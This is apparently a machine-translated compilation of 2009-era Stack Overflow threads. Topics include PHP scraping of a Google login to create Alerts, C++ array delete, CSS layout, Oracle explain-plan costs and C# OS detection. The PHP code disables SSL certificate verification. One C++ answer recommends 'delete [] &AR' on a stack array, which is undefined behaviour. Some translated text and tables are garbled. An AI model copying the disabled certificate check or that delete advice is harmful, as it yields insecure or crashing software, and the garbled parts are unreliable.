        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $COOKIEFILE);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $COOKIEFILE);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 120);
        curl_setopt($ch, CURLOPT_TIMEOUT, 120);

        curl_setopt($ch, CURLOPT_URL,
            'https://accounts.google.com/ServiceLogin?hl=en&service=alerts&continue=http://www.google.com/alerts/manage');
        $data = curl_exec($ch);

        $formFields = $this->getFormFields($data);

        $formFields['Email']  = $USERNAME;
        $formFields['Passwd'] = $PASSWORD;
        unset($formFields['PersistentCookie']);

        $post_string = '';
        foreach($formFields as $key => $value) {
            $post_string .= $key . '=' . urlencode($value) . '&';
        }

        $post_string = substr($post_string, 0, -1);

        curl_setopt($ch, CURLOPT_URL, 'https://accounts.google.com/ServiceLoginAuth');
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);

        $result = curl_exec($ch);

        if (strpos($result, '<title>') === false) {
            return false;

        } else {
            curl_setopt($ch, CURLOPT_URL, 'http://www.google.com/alerts');
            curl_setopt($ch, CURLOPT_POST, 0);
            curl_setopt($ch, CURLOPT_POSTFIELDS, null);

            $result = curl_exec($ch);

            curl_setopt($ch, CURLOPT_URL, 'http://www.google.com/alerts/create');
            curl_setopt($ch, CURLOPT_POST, 0);
            $result = curl_exec($ch);
            //var_dump($result);
            $result = $this->getFormFieldsCreate($result);
            $result['q'] = $alert;
            $result['t'] = '7';
            $result['f'] = '1';
            $result['l'] = '0';
            $result['e'] = 'feed';
            unset($result['PersistentCookie']);

            $post_string = '';
            foreach($result as $key => $value) {
                $post_string .= $key . '=' . urlencode($value) . '&';
            }

            $post_string = substr($post_string, 0, -1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);
            $result = curl_exec($ch);
            curl_setopt($ch, CURLOPT_URL, 'http://www.google.com/alerts/manage');
            $result = curl_exec($ch);
            if (preg_match_all('%'.$alert.'(?=</a>).*?<a href=[\'"]http://www.google.com/alerts/feeds/([^\'"]+)%i', $result, $matches)) {
                return ('http://www.google.com/alerts/feeds/'.$matches[1][0]);
            } else {
                return false;
            }

        }
    }

    private function getFormFields($data)
    {
        if (preg_match('/(<form.*?id=.?gaia_loginform.*?<\/form>)/is', $data, $matches)) {
            $inputs = $this->getInputs($matches[1]);

            return $inputs;
        } else {
            die('didnt find login form');
        }
    }
    private function getFormFieldsCreate($data)
    {
        if (preg_match('/(<form.*?name=.?.*?<\/form>)/is', $data, $matches)) {
            $inputs = $this->getInputs($matches[1]);

            return $inputs;
        } else {
            die('didnt find login form1');
        }
    }

    private function getInputs($form)
    {
        $inputs = array();

        $elements = preg_match_all('/(<input[^>]+>)/is', $form, $matches);

        if ($elements > 0) {
            for($i = 0; $i < $elements; $i++) {
                $el = preg_replace('/\s{2,}/', ' ', $matches[1][$i]);

                if (preg_match('/name=(?:["\'])?([^"\'\s]*)/i', $el, $name)) {
                    $name  = $name[1];
                    $value = '';

                    if (preg_match('/value=(?:["\'])?([^"\'\s]*)/i', $el, $value)) {
                        $value = $value[1];
                    }

                    $inputs[$name] = $value;
                }
            }
        }

        return $inputs;
    }
}
$alert = new googleAlerts;
echo $alert->createAlert('YOUR ALERT'); 
```

它将返回指向您新创建警报的 rss 提要的链接

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-02-22T19:21:56.210

[我在这里](https://github.com/adasq/google-alerts-api)找到了 Google Alerts API 。它非常小，我还没有测试过。

# actionscript-3 - 最佳 ActionScript 3 介绍书籍/教程？

> ID：860444
> 
> 赞同：2
> 
> 时间：2009-05-13T21:09:19.327
> 
> 标签：actionscript-3

你有什么选择？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-14T04:48:36.787

老实说，最好的入门（和终结！）书是 Moock 的[Essential Actionscript 3.0](http://oreilly.com/catalog/9780596526948/)。它很聪明，写得很好，而且很容易从头到尾阅读。如果您打算进行 Flex 开发，您还应该学习[Programming Flex 3](http://oreilly.com/catalog/9780596516215/)。它具有 (IMO) 对 Flex 组件生命周期的最佳描述。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-14T07:46:06.347

TypeOneError，我恭敬地不同意:)

Moock's 是一本很棒的书，但我看不到有人“从头到尾”阅读它。我在家里有一份副本，只有在对某些特定内容有疑问时才打开它。然后我阅读了关于上述疑问的章节，通常我会得到答案，一个很好的解决方案指针或其他我不知道但仍然很有趣的东西。

它也专注于开发人员，而不是设计师记住这一点。

有点离题，但我没有在任何地方读到的关于从 AS2 过渡到 AS3 的最佳建议是**安装 Flash player 的调试版本**。AVM2*非常*敏感，但由于以下任何原因，它会静默失败：

*   参数类型错误
*   参数数量错误
*   为空时访问变量
*   等等

如果您正在使用调试版本进行开发，您会得到一个响亮而清晰的错误，您可以快速修复它，否则您的应用程序将直接停止而没有警告。

！

胡安

# c++ - “删除”的数组形式是什么？

> ID：860447
> 
> 赞同：22
> 
> 时间：2009-05-13T21:10:42.647
> 
> 标签：c++, arrays, memory-management

当我使用数组名作为指针编译代码并使用 删除数组名`delete`时，我收到一条警告，提示我在不使用数组形式的情况下删除数组（我不记得确切的措辞）。

基本代码是：

```
int data[5];
delete data; 
```

那么，delete的数组形式是什么？

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2009-05-13T21:11:21.520

delete的数组形式为：

```
delete [] data; 
```

**编辑：**但正如其他人指出的那样，您不应该要求`delete`这样定义的数据：

```
int data[5]; 
```

您应该只在使用`new`如下分配内存时调用它：

```
int *data = new int[5]; 
```

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2009-05-13T21:45:26.927

你要么想要：

```
int *data = new int[5];
... // time passes, stuff happens to data[]
delete[] data; 
```

或者

```
int data[5];
... // time passes, stuff happens to data[]
// note no delete of data 
```

一般规则是：仅适用`delete`于来自`new`. 如果使用了数组形式`new`，则*必须*使用数组形式`delete`来匹配。如果`new`使用了placement，那么您要么根本不打电话`delete`，要么使用匹配的placement `delete`。

由于变量`int data[5]`是一个静态分配的数组，它不能传递给任何形式的`delete`操作符。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-05-13T21:54:47.690

正如其他人所说，您必须使用删除的向量形式：

```
void some_func(size_t n)
{
  int* data = new int[n];

  . . . // do stuff with the array

  delete [] data; // Explicitly free memory
} 
```

对此要非常小心，因为有些编译器*不会*警告你。

更好的是，很少需要使用矢量新/删除。考虑是否可以更改您的代码以使用 std::vector：

```
void some_func(size_t n)
{
  std::vector<int> data(n);

  . . . // do stuff with the array

} // memory held by data will be freed here automatically 
```

如果您在本地范围内处理内存，请考虑使用[STLSoft](http://stlsoft.org/)的[auto_buffer](http://www.stlsoft.org/doc-1.9/classstlsoft_1_1auto__buffer.html)，如果可能，它将从内部缓冲区（作为实例的一部分保存在堆栈上）分配，只有在不能时才进入堆：

```
void some_func(size_t n)
{
  stlsoft::auto_buffer<int, 10> data(n); // only allocates if n > 10

  . . . // do stuff with the array

} // memory held by data will be freed here automatically, if any was allocated 
```

阅读[有关 auto_buffer](http://www.ddj.com/cpp/184401740)的更多信息。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-05-13T21:45:24.290

所示代码在堆栈上或数据段的初始化部分中具有数组，即您不释放它（正如其他人所提到的那样，这将是“未定义的行为”。）它是否在“免费商店”，您可以使用`delete [] data`.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-13T21:32:26.230

正如RichieHindle 上面所说，当您想要释放为指向的数组动态分配的空间时，您必须在保留字和指向分配空间开头的指针之间`data`放置两个括号。由于可以指向内存中的单个元素以及数组中的第一个元素，这是让编译器知道您要删除整个内存块的唯一方法。如果您没有以正确的方式执行此操作，则行为是“未确定的”（Stroustrup，*C++ 编程语言*）。`[]``delete``data``int`

 ** * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-01-17T01:12:10.160

修复 C4154 和 C4156 警告

```
float AR[5] = { 1.0f, 2.0f, ..., ..., ...};

delete [] & AR; 
```

# html - 两个 div 之间的垂直线间隔

> ID：860448
> 
> 赞同：19
> 
> 时间：2009-05-13T21:10:42.647
> 
> 标签：html, css, layout

所以我有两个div。一个带有导航链接的左侧 div 和一个根据您在左侧单击的链接填充内容的右侧 div。我想在导航和将两者分开的内容之间有一条垂直的灰线，但我需要它根据右侧内容 div 的长度来改变高度。（而且如果右侧没有导航那么长，则默认情况下将线转到导航的底部）。

因此，如果用户单击使正确内容 div 非常长的链接，我需要垂直线动态更改其高度并一直向下，但如果内容不像导航那么长，我仍然需要它一直走到导航的尽头。

我正在尝试使用边框和高度：100% 但我无法跨浏览器工作。（IE 和 FF）谢谢！

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-05-13T21:17:40.560

假设你的左导航 div 有一个固定的高度，或者一个不经常改变的高度。假设您的左侧导航 div 的高度为 400 像素。然后：

```
div.leftnav {
   height: 400px;
   float: left;
}

div.rightContent {
   min-height: 400px;
   border-left: 1px solid gray;
   float:left;
} 
```

请记住，IE6 不支持“最小高度”。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-05-13T21:35:28.423

您可以让导航 div 在右侧有边框，而内容 div 在左侧有边框。让这两个边界重叠应该会产生预期的效果。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-05-13T21:17:50.077

最好的选择是父 div 的重复背景图像，其中垂直灰线位置适当。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-13T21:18:41.807

我曾经通过使用在 y 轴上重复的背景图像解决了这个问题。只需将其创建为与您的页面一样宽，并且不是很高，可能是 10-20 像素。然后向下重复。可能有点作弊，但它在某些情况下有效：p

我如何做到这一点的一个例子你可以在[这个网站](http://vipersystem.net/)上看到。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2011-09-18T06:33:08.903

我这样做的方法是将元素放入隐藏溢出的容器 div 中。然后将左边框应用于所有重复的 div。然后，在所有浮动子元素上设置 css 属性： padding-bottom:2000px; margin-bottom-2000px;

例子：

CSS

```
div.vert-line{overflow:hidden}
div.vert-line>div+div{border-left:#color;}
div.vert-line>div{width:200px; float:left; padding-bottom:2000px; margin-bottom:-2000px;} 
```

HTML

```
<div class="vert-line>
  <div>Left Side</div>
  <div>Right Side</div>
</div> 
```

希望这可以帮助！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-13T21:18:03.787

这个问题的答案可能会对您有所帮助：

[扩展侧边栏向下页面](https://stackoverflow.com/questions/846792/extending-sidebar-down-page/846825#846825)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-07-25T05:57:58.303

`border-left`您可以在右侧 div 上使用 css 。

```
.vertical_line { border-left: 1px solid #f2f2f2; }

<div>
  <p>first div</p>
</div>
<div class="vertical_line">
  <p>second div</p>
</div> 
```

# oracle - 了解 Oracle SQL Developer 中执行解释计划的结果

> ID：860450
> 
> 赞同：73
> 
> 时间：2009-05-13T21:11:06.203
> 
> 标签：oracle, oracle-sqldeveloper, sql-execution-plan

我正在尝试优化查询，但不太了解从**Explain Plan**返回的一些信息。谁能告诉我 OPTIONS 和 COST 列的意义？在 OPTIONS 列中，我只看到 FULL 一词。在 COST 列中，我可以推断出较低的成本意味着更快的查询。但是成本值究竟代表什么，什么是可接受的阈值？

* * *

## 回答 #1

> 赞同：122
> 
> 时间：2009-05-15T07:20:47.037

EXPLAIN PLAN 的输出是 Oracle 查询优化器的调试输出。COST 是基于成本的优化器 (CBO) 的最终输出，其目的是选择应该使用许多不同的可能计划中的哪一个来运行查询。CBO 计算每个计划的相对成本，然后选择成本最低的计划。

（注意：在某些情况下，CBO 没有足够的时间来评估每一个可能的计划；在这些情况下，它只会选择迄今为止发现的成本最低的计划）

一般来说，导致查询缓慢的最大因素之一是为查询服务而读取的行数（更准确地说是块），因此成本将*部分*取决于优化器估计需要的行数被阅读。

例如，假设您有以下查询：

```
SELECT emp_id FROM employees WHERE months_of_service = 6; 
```

（该`months_of_service`列上有一个 NOT NULL 约束和一个普通索引。）

优化者可以在这里选择两个基本计划：

*   方案 1：读取“employees”表中的所有行，检查每个行的谓词是否为真（`months_of_service=6`）。
*   方案 2：读取索引 where `months_of_service=6`（这会产生一组 ROWID），然后根据返回的 ROWID 访问表。

假设“employees”表有 1,000,000（100 万）行。让我们进一步想象一下，months_of_service 的值在 1 到 12 之间，并且由于某种原因分布相当均匀。

**计划 1**的成本，它涉及一次 FULL SCAN，将是读取 employees 表中所有行的成本，大约等于 1,000,000；但是由于 Oracle 通常能够使用多块读取来读取块，因此实际成本会更低（取决于您的数据库的设置方式）-例如，假设多块读取计数为 10-计算的成本完整扫描将是 1,000,000 / 10；总成本 = 100,000。

**计划 2**的成本，包括 INDEX RANGE SCAN 和按 ROWID 查找表，将是扫描索引的成本，加上按 ROWID 访问表的成本。我不会讨论索引范围扫描的成本，但让我们假设索引范围扫描的成本是每行 1；我们希望在 12 个案例中找到匹配项，因此索引扫描的成本为 1,000,000 / 12 = 83,333；加上访问表的成本（假设每次访问 1 个块读取，我们不能在这里使用多块读取）= 83,333；总成本 = 166,666。

如您所见，计划 1（全扫描）的成本低于计划 2（索引扫描 + 按 rowid 访问）的成本 - 这意味着 CBO 将选择全扫描。

如果优化器在这里所​​做的假设是正确的，那么实际上计划 1 将比计划 2 更可取且效率更高——这反驳了 FULL 扫描“总是不好”的神话。

如果优化器的目标是 FIRST_ROWS(n) 而不是 ALL_ROWS，那么结果会完全不同——在这种情况下，优化器会支持计划 2，因为它通常会更快地返回前几行，但代价是整个查询的效率较低.

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-05-14T17:41:14.137

CBO 构建决策树，估计每个查询可用的每个可能执行路径的成本。成本由实例上设置的 CPU_cost 或 I/O_cost 参数设置。CBO 会根据查询将使用的表和索引的现有统计信息尽可能地估计成本。您不应仅根据成本调整查询。成本可以让您了解优化器为什么要这样做。无需成本，您就可以弄清楚为什么优化器选择了它所做的计划。更低的成本并不意味着更快的查询。在某些情况下这是正确的，并且在某些情况下是错误的。成本基于您的餐桌统计数据，如果它们错误，则成本将是错误的。

在调整查询时，您应该查看每个步骤的基数和行数。它们有意义吗？优化器假设的基数是否正确？返回的行是否合理。如果存在的信息是错误的，那么优化器很可能没有做出正确决策所需的正确信息。这可能是由于表和索引以及 cpu-stats 上的统计信息过时或缺失。在调整查询以充分利用优化器时，最好更新统计信息。了解您的架构在调优时也有很大帮助。知道优化器何时选择了一个非常糟糕的决定并用一个小提示将其指向正确的路径可以节省大量时间。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-05-13T21:25:43.103

以下是在 Oracle 中使用 EXPLAIN PLAN 的参考：http: [//download.oracle.com/docs/cd/B19306_01/server.102/b14211/ex_plan.htm](http://download.oracle.com/docs/cd/B19306_01/server.102/b14211/ex_plan.htm)），其中包含有关在此处找到的列的具体信息：[http:// /download.oracle.com/docs/cd/B19306_01/server.102/b14211/ex_plan.htm#i18300](http://download.oracle.com/docs/cd/B19306_01/server.102/b14211/ex_plan.htm#i18300)

您提到“FULL”向我表明该查询正在执行全表扫描以查找您的数据。这没关系，在某些情况下，否则表明索引/查询编写不佳。

通常，使用解释计划，您希望确保您的查询使用键，因此 Oracle 可以通过访问尽可能少的行数来找到您要查找的数据。最终，您有时只能在表的体系结构方面做到这一点。如果成本仍然太高，您可能不得不考虑调整架构的布局以更加基于性能。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-09-02T09:42:49.237

在最近的 Oracle 版本中，COST 表示优化器期望查询花费的时间量，以单个块读取所需的时间量为单位表示。

因此，如果单个块读取需要 2ms 并且成本表示为“250”，则预计查询需要 500ms 才能完成。

优化器根据估计的单块和多块读取数以及计划的 CPU 消耗来计算成本。后者对于通过在其他操作之前执行某些操作来尽量避免高 CPU 成本操作来最小化成本非常有用。

这就提出了优化器如何知道操作需要多长时间的问题。最近的 Oracle 版本允许收集“系统统计信息”，绝对不要将其与表或索引的统计信息相混淆。系统统计数据是对硬件性能的测量，最重要的是：

1.  单块读取需要多长时间
2.  多块读取需要多长时间
3.  多块读取有多大（由于表范围小于最大值以及其他原因，通常与可能的最大值不同）。
4.  中央处理器性能

这些数字可以根据系统的运行环境而有很大差异，并且可以为“白天 OLTP”操作和“夜间批量报告”操作以及“月末报告”存储不同的统计数据集（如果您愿意）。

给定这些统计数据集，可以评估给定查询执行计划在不同操作环境中的成本，这可能会促进在某些时候使用全表扫描或在其他时候使用索引扫描。

成本并不完美，但优化器在每次发布时都会更好地自我监控，并且可以将实际成本与估计成本进行比较，以便为未来做出更好的决策。这也使得预测变得相当困难。

请注意，成本不一定是挂钟时间，因为并行查询操作会跨多个线程消耗总时间。

在旧版本的 Oracle 中，CPU 操作的成本被忽略了，单块和多块读取的相对成本根据 init 参数有效地固定。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-05-13T21:26:35.943

FULL 可能是指全表扫描，这意味着没有使用索引。这通常表明有问题，除非查询应该使用表中的所有行。

成本是一个数字，表示不同负载、处理器、内存、磁盘、IO 的总和，高数字通常是不好的。当移动到计划的根部时，这些数字会相加，并且应该检查每个分支以定位瓶颈。

您可能还想查询 v$sql 和 v$session 以获取有关 SQL 语句的统计信息，这将包含所有类型的资源、时间和执行的详细指标。

# php - Jquery循环 - 捕获值

> ID：860454
> 
> 赞同：1
> 
> 时间：2009-05-13T21:11:48.650
> 
> 标签：php, jquery

我在 php 中运行此循环，但在输出期间使用 jquery click 函数。如何记录单击了 $i 的哪个实例。当我使用 $(this) 它返回 id。

$('#pid-form').val('$frame_id[$i]') 实际上有我想要的数字作为值，但我不知道如何使用它或将其转换为我可以使用的变量.

```
for($i = 0; $i < $numRecords2; $i++){

$prod_id = $_SESSION['prod_array'][$frame_id[$i]];
echo"

$('#frame$frame_id[$i]').click(function() {
    $('#top-left-frame').html('<img src=\"$upper_left[$i]\" alt=\"\" />');
    $('#top-mid-frame').css('background-image','url($upper_middle[$i])'); 
    $('#top-right-frame').html('<img src=\"$upper_right[$i]\" alt=\"\" />');
    $('#mid-left-frame').css('background-image','url($middle_left[$i])'); 
    $('#mid-right-frame').css('background-image','url($middle_right[$i])'); 
    $('#bottom-left-frame').html('<img src=\"$bottom_left[$i]\" alt=\"\" />');
    $('#bottom-mid-frame').css('background-image','url($bottom_middle[$i])'); 
    $('#bottom-right-frame').html('<img src=\"$bottom_right[$i]\" alt=\"\" />');
    $('#frame-select').html('$prod_id');
    $('#pid-form').val('$frame_id[$i]');
    $('#oa_id-form').val('$prod_id');
    var frameState = $(this).attr('id');
    $.cookie('frameState', frameState, { expires: 7 });     
    alert($.cookie('frameState') + ' was clicked.');
 });
";
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-05-13T21:24:14.403

为什么不像你已经在脚本中其他任何地方所做的那样简单地对其进行硬编码呢？

注意：恕我直言，这是一个非常糟糕的设计；而不是为数组中的每个元素创建所有这些，您应该创建一个静态 JS 函数来完成所有这些，然后使用参数调用它以传递额外的信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-14T14:12:30.113

如果 "frame$frame_id[$i]" 是被点击对象的 id，您可以使用以下方法提取 id：

```
$(this).attr('id').replace(/[^\[]*\[([^\]]*)\]$/, '$1') 
```

这将操纵 id 并仅返回括号之间的值。

# sql - 在 select 语句中替换多个实例

> ID：860458
> 
> 赞同：4
> 
> 时间：2009-05-13T21:12:18.447
> 
> 标签：sql, sql-server, replace

用户 SQLServer 2005 这是我坚持使用的字符串示例： {\rtf1\ansi\ansicpg1252\deff0\deflang1033{\fonttbl{\f0\fnil\fcharset0 Arial Rounded MT Bold;}{\f1\fnil\fcharset0 Arial ;}} \viewkind4\uc1\pard\f0\fs54 1000\f1\fs20\par }

我想用“Times New Roman”替换任何字体名称

我可以得到第一个（textlong1 是字段）：

```
 Select Replace(textlong1, 
        CASE When CharIndex(';',textlong1)> 10 Then
        SubString(textlong1
        , Charindex('fcharset',textlong1)+10
        , CharIndex(';',textlong1) - Charindex('fcharset',textlong1)-10) 
        Else '' End
        , 'Times New Roman') From exampletable 
```

我正在使用 case 语句来防止 SubString 出错。

因为我没有替换'fcharset'，所以即使我循环，它也没有找到第二个实例（总是卡在第一个实例上）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-13T21:36:54.617

如果您可以集成 .NET CLR 功能（MSDN 有很多这样做的示例），您可以使用正则表达式替换并使您的任务变得非常简单。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-14T07:55:13.530

如果您可以更换第一个，请继续更换直到没有第一个。如果您正在进行更新：

```
declare @done bit
while @done <> 1
    begin
    UPDATE ...
    if @@rowcount = 0 set done = 1
    end 
```

或选择一个新变量：

```
declare @cur varchar(4000)
declare @next varchar(4000)
set @cur = 'The string to operate on'
set @next = ''
while @cur <> @next
    begin
    set @next = @cur
    select @cur = REPLACE(@next,...)
    end 
```

最终结果现在存储在 @cur （和 @next 也是。）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T21:27:14.240

您始终可以使用定界符过程来分隔字体列表实例周围的字符串，并用 times new roman 替换它们。

# c# - 使用 Environment.OSVersion 确定操作系统

> ID：860459
> 
> 赞同：18
> 
> 时间：2009-05-13T21:12:21.253
> 
> 标签：c#, asp.net, windows

`System.Environment.OSVersion`使用命名空间 确定托管 ASP.NET 应用程序的 Microsoft 操作系统的最佳方法是什么

我需要一个适用于 Windows XP、Windows Server 2003 和 Windows Vista 的示例

这是我尝试使用伪代码完成的任务

```
switch(/* Condition for determining OS */)
{
    case "WindowsXP":
        //Do Windows XP stuff
        break;
    case "Windows Server 2003":
        //Do Windows Server 2003 stuff
        break;
    case "Windows Vista":
        //Do Windows Vista stuff
        break;
} 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-05-13T21:23:30.067

以下应该工作。但你为什么在乎？仅用于日志记录的信息目的，还是您正在寻找目标平台上存在的实际功能？

```
if (Environment.OSVersion.Version.Major == 5)
{
    if (Environment.OSVersion.Version.Minor == 1)
    {
             // XP
    }
    else if (Environment.OSVersion.Version.Minor == 2)
    {
             // Server 2003\.  XP 64-bit will also fall in here.
    }
}
else if (Environment.OSVersion.Version.Major >= 6)
{
        // Vista on up
} 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-05-13T21:22:42.983

不是一个完整的列表，但从[http://support.microsoft.com/kb/304283](http://support.microsoft.com/kb/304283)得到这个：

```
+-------------------------------------------------- -------------+
| |Windows|Windows|Windows|Windows NT|Windows|Windows|
| | 95 | 98 | 我 | 4.0 | 2000 | 经验 |
+-------------------------------------------------- -------------+
|平台ID | 1 | 1 | 1 | 2 | 2 | 2 |
+-------------------------------------------------- -------------+
|专业 | | | | | | |
| 版本 | 4 | 4 | 4 | 4 | 5 | 5 |
+-------------------------------------------------- -------------+
|次要 | | | | | | |
| 版本 | 0 | 10 | 90 | 0 | 0 | 1 |
+-------------------------------------------------- -------------+

```

编辑：注意，如果应用程序在兼容模式下运行，System.Environment.OSVersion 返回的信息可能不可靠。

Edit2：我建议您在应用程序中将其设置为可配置值 - 这样您的代码在新操作系统出现时不需要重新编译，例如 Windows 7。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-08-07T21:09:26.673

如果您不必具体了解 R2 的服务器版本，一个更简单的替代方案是：

```
enum OS { _2000, XP, Server2003, Vista, Server2008, _7, Server2012, _8 }

const int OS_ANYSERVER = 29;

[DllImport("shlwapi.dll", SetLastError = true, EntryPoint = "#437")]
static extern bool IsOS(int os);

static bool isWindowsServer = IsOS(OS_ANYSERVER);

public static OS GetOS()
{
    var version = Environment.OSVersion.Version;
    switch (version.Major)
    {
        case 5:
            switch (version.Minor)
            {
                case 0:
                    return OS._2000;
                case 1:
                    return OS.XP;
                case 2:
                    return isWindowsServer ? OS.Server2003 : OS.XP;
            }
            break;
        case 6:
            switch (version.Minor)
            {
                case 0:
                    return isWindowsServer ? OS.Server2008 : OS.Vista;
                case 1:
                    return isWindowsServer ? OS.Server2008 : OS._7;
                case 2:
                    return isWindowsServer ? OS.Server2012 : OS._8;
            }
            break;
    }

    throw new Exception("Strange OS");
} 
```

[从这里](https://stackoverflow.com/a/3138781/661933)复制。

更具体地说，您的选择是，

1.  WMI，您将不得不进行一些手动解析。不确定用户权限是否会伤害非管理员用户。

2.  [GetVersionEx](http://msdn.microsoft.com/en-gb/library/windows/desktop/ms724833%28v=vs.85%29.aspx)如[本答案](https://stackoverflow.com/a/15511176/661933)所述。

3.  检查`ProductName`在

    ```
    HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ 
    ```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-05-13T21:19:23.677

```
if(Environment.OSVersion.Version.Major > 5) { /* vista and above */ } 
```

# c - 从管道读取的字节数

> ID：860467
> 
> 赞同：1
> 
> 时间：2009-05-13T21:15:26.147
> 
> 标签：c, linux, pipe

在 Linux（C，fread/类似）中从管道读取时，当到达 EOF 时，如何知道读取了多少字节？如果我一次读取块，fread() 只返回读取的完整块的数量，并且我不能一次读取一个字节，因为这太慢了。当然， ftell() 返回 -1。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-05-13T21:19:06.440

您可以`fread()`通过将`size`参数设置为 1 并将 设置为`nmembers`您喜欢的任何大小来做到这一点。那么“成员”的数量就是字节数，你仍然可以拥有一个大小合适的缓冲区：

```
char     buf[8192];
size_t   n;
n = fread(buf, 1, sizeof buf, f); 
```

代替

```
char     buf[8192];
size_t   n;
n = fread(buf, sizeof buf, 1, f); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T21:24:18.177

`read()`返回读取的字节数（当没有出错时）。

# c# - 在 C 风格的块注释中包含 */

> ID：860468
> 
> 赞同：4
> 
> 时间：2009-05-13T21:15:26.443
> 
> 标签：c#, c++, c, comments, block-comments

有没有办法在 C 风格的块注释中包含 */ ？在这种情况下，不能将块注释更改为一系列行注释 (//)。

这是导致问题的注释的示例：

```
/**
 * perl -pe 's/(?<=.{6}).*//g' : Limit to PID
 */ 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2009-05-13T21:18:07.487

通常评论不需要是字面的，所以这不会经常出现。

您可以将其全部包装在 #if 块中：

```
#if 0
whatever you want can go here, comments or not
#endif 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-05-13T21:16:59.890

没有！没有。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-05-13T21:29:53.287

您可以通过修改您的正则表达式以不包含有问题的字符序列来回避这个问题。从你正在做的事情来看，这应该可以工作（使 * 非贪婪）：

```
/**
 * perl -pe 's/(?<=.{6}).*?//g' : Limit to PID
 */ 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-05-13T21:28:51.790

在一般情况下，你不能。

这是在这种情况下发生的一个棘手的答案：

```
/**
 * perl -pe 's/(?<=.{6}).* //gx' : Limit to PID
 */ 
```

这是（或者应该是，我实际上并没有测试 perl 命令）一个与原始匹配相同的正则表达式，因为 x 修饰符允许在表达式中使用空格以保持清晰，从而允许`*`将`/`.

你可以使用更多的空格，我只包含了打破注释块标记结尾的单个空格。

一些编译器支持打开允许嵌套注释的非标准功能的选项。这通常是一个坏主意，但在这种特殊情况下，您也可以这样做

```
/** 
 * /* perl -pe 's/(?<=.{6}).*//g' : Limit to PID
 */ 
```

仅针对此源文件打开该选项。当然，正如上面片段中时髦的颜色所证明的那样，您的其他工具可能不知道您在做什么，并且会做出错误的猜测。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-14T17:00:14.173

对于这种特定情况，您可以[更改](http://perldoc.perl.org/perlop.html#s/PATTERN/REPLACEMENT/msixpogce)perl 正则表达式上的分隔符。您可以使用任何非字母数字、非空白分隔符。在这里我切换到`#`：

```
/** 
 * perl -pe 's#(?<=.{6}).*##g' : Limit to PID
 */ 
```

常见的选择是`#`和`%`。

像括号或大括号这样的“括号字符”的语法略有不同，因为它们应该是匹配的对：

```
/** 
 * perl -pe 's[(?<=.{6}).*][]g' : Limit to PID
 */ 
```

# c++ - 嵌套 C++ 模板定义

> ID：860476
> 
> 赞同：1
> 
> 时间：2009-05-13T21:17:07.567
> 
> 标签：c++, templates, callback, functor

我有点滥用 C++ 模板，但我无法弄清楚一些事情。假设我有两种确实应该从基本类型继承的类型，但是出于速度原因，我无法承受虚函数开销（我已经对其进行了基准测试，而虚调用毁了我的一切！）。

首先，这是我的两个课程

```
template<class DataType> class Class1
{
    //Lots of stuff here
}

template<Class DataType> class Class2
{
    //The same stuff as in Class1, but implemented differently
} 
```

在典型的 oo 设计中，`Class1`并且`Class2`会继承自`IInterface`并且我可以有一个看起来像这样的函数

```
DoStuff(IInterface& MyInterface)
{
} 
```

但是我做不到，所以我做了这个

```
template <class C>
DoStuff(C& c)
{
} 
```

我知道这并不漂亮，因为（在编译器级别）没有任何东西可以强制执行`Class1`并`Class2`实现相同的接口，但是出于速度原因，我违反了一些规则。

我想做的是在 上创建一个回调函数`DoStuff`，但我不知道如何使它与模板一起工作（特别是因为那里隐藏着。

例如，这现在有效

```
DoStuff(char* filename)
{
    switch (//figure out the type i need to make)
    {
    case 1: return DoStuff(Class1<int>(filename));
    case 2: return DoStuff(Class1<double>(filename));
    }
}

template<class DataType>
DoStuff(DataType* pdata)
{
